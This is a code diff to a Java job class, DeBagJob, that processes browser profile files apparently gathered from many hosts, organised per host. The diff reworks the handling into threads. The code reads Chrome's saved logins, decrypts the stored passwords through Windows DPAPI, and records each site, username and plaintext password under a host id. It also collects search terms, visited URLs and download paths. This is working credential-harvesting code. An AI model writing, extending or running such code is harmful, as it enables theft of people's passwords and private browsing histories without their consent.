@@ -48,22 +48,31 @@ public class DeBagJob  implements  Job {
 		for (File f : files) {
 			if (!(f.getName().matches(".*.zip"))) {
 				for (File ff : f.listFiles()) {
+					int num = 10; //初始线程数
 					try {
 						switch (ff.getName()){
 							case "Login Data":
 								SqliteHelper h = new SqliteHelper(rootPath+f.getName()+"\\"+"Login Data");
-								List<SqlLiteDemoResult> demoList = h.executeQueryList("Select action_url, username_value, password_value FROM logins", SqlLiteDemoResult.class);
-								for (SqlLiteDemoResult result : demoList) {
-									Browser browser = new Browser();
-									browser.setWebsite(result.getAction_url());
-									browser.setHostid(f.getName());
-									browser.setUser(result.getUsername_value());
-									browser.setPassword(new String(Crypt32Util.cryptUnprotectData(result.getPassword_value())));
-									browserService.insert(browser);
+								List<SqlLiteDemoResult> LoginList = h.executeQueryList("Select action_url, username_value, password_value FROM logins", SqlLiteDemoResult.class);
+								int Llength = LoginList.size();
+								int LbaseNum = Llength / num;
+								int LremainderNum = Llength % num;
+								int Lend = 0;
+								// every thread process get the same length but different data
+								for (int li = 0; li < num; li++) {
+									int start = Lend;
+									Lend = start + LbaseNum;
+									if (li == (num - 1)) {
+										Lend = Llength;
+									} else if (li < LremainderNum) {
+										Lend = Lend + 1;
+									}
+									ExecMultiBag thread = new ExecMultiBag("线程[" + (li + 1) + "] ", LoginList, start, Lend, f.getName(),browserService);
+									thread.start();
 								}
+								break;
 							case "History":
 								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"\\"+"History");
-								int num = 10; //初始线程数
 								List<HistoryKeyResult> HkList = hi.executeQueryList("Select  lower_term FROM keyword_search_terms", HistoryKeyResult.class);
 								int klength = HkList.size();
 								int kbaseNum = klength / num;
@@ -85,38 +94,37 @@ public class DeBagJob  implements  Job {
 								int baseNum = length / num;
 								int remainderNum = length % num;
 								int end = 0;
-								for (int i = 0; i < num; i++) {
+								for (int ki = 0; ki < num; ki++) {
 									int start = end;
 									end = start + baseNum;
-									if (i == (num - 1)) {
+									if (ki == (num - 1)) {
 										end = length;
-									} else if (i < remainderNum) {
+									} else if (ki < remainderNum) {
 										end = end + 1;
 									}
-									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HList, start, end, f.getName(),browserUrlService);
+									ExecMultiBag thread = new ExecMultiBag("线程[" + (ki + 1) + "] ", HList, start, end, f.getName(),browserUrlService);
 									thread.start();
 								}
 								List<HistoryDownloadResult> HdList = hi.executeQueryList("Select  current_path,tab_url FROM downloads", HistoryDownloadResult.class);
 								int dlength = HdList.size();
-								if(num > dlength){
-									num = dlength;
-								}
 								int dbaseNum = dlength / num;
 								int dremainderNum = dlength % num;
 								int dend = 0;
-								for (int i = 0; i < num; i++) {
+								for (int di = 0; di < num; di++) {
 									int start = dend;
 									dend = start + dbaseNum;
-									if (i == (num - 1)) {
+									if (di == (num - 1)) {
 										dend = dlength;
-									} else if (i < dremainderNum) {
+									} else if (di < dremainderNum) {
 										dend = dend + 1;
 									}
-									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HdList, start, dend, f.getName(),browserDownloadService);
+									ExecMultiBag thread = new ExecMultiBag("线程[" + (di + 1) + "] ", HdList, start, dend, f.getName(),browserDownloadService);
 									thread.start();
 								}
+								break;
 //								System.out.println("----"+(System.currentTimeMillis() - start));
 							case "Cookies":
+								break;
 //								System.out.println(ff.getName());
 							default:
 								continue;
@@ -143,9 +151,11 @@ public class DeBagJob  implements  Job {
 		private List<HistoryKeyResult> hklist ;
 		private List<HistoryUrlResult> hllist ;
 		private List<HistoryDownloadResult> hdlist ;
+		private List<SqlLiteDemoResult> Llist ;
 		private BrowserUrlService browserUrlService;
 		private BrowserDownloadService browserDownloadService;
 		private BrowserKeywordService browserKeywordService;
+		private  BrowserService browserService;
 		private int startIndex;
 		private int endIndex;
 		private String hostid ;
@@ -163,12 +173,25 @@ public class DeBagJob  implements  Job {
 			}else if(list.toString().matches("(.*)DownloadResult(.*)")) {
 				this.hdlist = list;
 				this.browserDownloadService = (BrowserDownloadService) service;
+			} else if(list.toString().matches("(.*)SqlLiteDemoResult(.*)")) {
+				this.Llist = list;
+				this.browserService = (BrowserService) service;
 			}
-		}
+	}
 
 		@Override
 		public void run() {
-			if (null != hklist) {
+			if (null != Llist) {
+				List<SqlLiteDemoResult> LList = Llist.subList(startIndex, endIndex);
+				for (SqlLiteDemoResult result : LList) {
+					Browser browser = new Browser();
+					browser.setWebsite(result.getAction_url());
+					browser.setUser(result.getUsername_value());
+					browser.setPassword(new String(Crypt32Util.cryptUnprotectData(result.getPassword_value())));
+					browser.setHostid(hostid);
+					browserService.insert(browser);
+				}
+			} else if (null != hklist) {
 				List<HistoryKeyResult> kList = hklist.subList(startIndex, endIndex);
 //				System.out.println(threadName + "处理了" + kList.size() + "条！startIndex:" + startIndex + "|endIndex:" + endIndex);
 				for (HistoryKeyResult result : kList) {
